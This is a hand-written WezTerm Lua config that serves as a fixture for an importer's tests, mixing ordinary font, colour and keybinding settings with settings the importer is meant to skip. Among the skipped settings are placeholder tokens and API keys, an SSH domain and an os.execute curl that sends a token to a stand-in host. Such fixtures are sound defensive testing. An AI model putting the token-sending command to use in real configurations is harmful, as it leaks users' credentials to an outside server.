-- wezterm.lua, written by hand for the import tests (never copied from a real Mac). It is never run.
local wezterm = require 'wezterm'
local act = wezterm.action
local config = wezterm.config_builder()

-- Written out: these come over.
config.font = wezterm.font_with_fallback { 'Operator Mono', { family = 'JetBrains Mono', weight = 'Medium' } }
config.font_size = 14.0
config.default_cursor_style = 'BlinkingBar'
config.scrollback_lines = 20000
config.color_scheme = 'Night Owl' -- from colors/night-owl.toml
config.colors = {
  foreground = '#d6deeb',
  ansi = { '#011627', '#ef5350', '#22da6e', '#addb67', '#82aaff', '#c792ea', '#21c7a8', '#ffffff' },
  cursor_bg = 'orange',
}
config.window_background_opacity = 0.9
config.hide_tab_bar_if_only_one_tab = true
config.default_cwd = wezterm.home_dir
config.send_composed_key_when_right_alt_is_pressed = false

-- Never read: they run programs, set the environment or connect elsewhere.
config.default_prog = { '/bin/zsh', '-l', '-c', 'export TOKEN=eyJhbGciOiJIUzI1NiJ9.eyJmaXh0dXJlIjoic2VjcmV0In0.bm90LWEtcmVhbC1zaWduYXR1cmU; exec zsh' }
config.set_environment_variables = { OPENAI_API_KEY = 'FixtureSecretAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' }
config.ssh_domains = { { name = 'prod', remote_address = 'prod.example', username = 'deploy' } }

-- Worked out by Lua: named, never run.
local size = 13
config.line_height = size / 10
if wezterm.target_triple == 'aarch64-apple-darwin' then
  config.term = 'wezterm'
end
wezterm.on('update-status', function(window, pane)
  config.enable_tab_bar = false
end)
os.execute('curl https://example.invalid/?t=eyJhbGciOiJIUzI1NiJ9.eyJmaXh0dXJlIjoic2VjcmV0In0.bm90LWEtcmVhbC1zaWduYXR1cmU')
--[[ A long comment with a key = 'value' that isn't code:
config.font_size = 99
]]

config.keys = {
  { key = 't', mods = 'CMD', action = act.SpawnTab 'CurrentPaneDomain' },
  { key = 'd', mods = 'CMD', action = act.SplitHorizontal { domain = 'CurrentPaneDomain' } },
  { key = 'D', mods = 'CMD', action = act.SplitVertical { domain = 'CurrentPaneDomain' } },
  { key = '[', mods = 'CMD|SHIFT', action = act.ActivateTabRelative(-1) },
  { key = 'RightArrow', mods = 'CMD|OPT', action = act.ActivatePaneDirection 'Right' },
  { key = '1', mods = 'CMD', action = act.ActivateTab(0) },
  { key = 'k', mods = 'CMD', action = act.ClearScrollback 'ScrollbackAndViewport' },
  { key = 'Enter', mods = 'CMD|SHIFT', action = act.TogglePaneZoomState },
  { key = 'c', mods = 'CTRL|SHIFT', action = wezterm.action { CopyTo = 'Clipboard' } },
  { key = 'a', mods = 'LEADER', action = act.SpawnWindow },
  { key = 's', mods = 'CMD', action = act.SendString 'FixtureSecretAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' },
  { key = 'e', mods = 'CMD', action = wezterm.action_callback(function(win, pane) win:perform_action(act.Nop, pane) end) },
}

return config
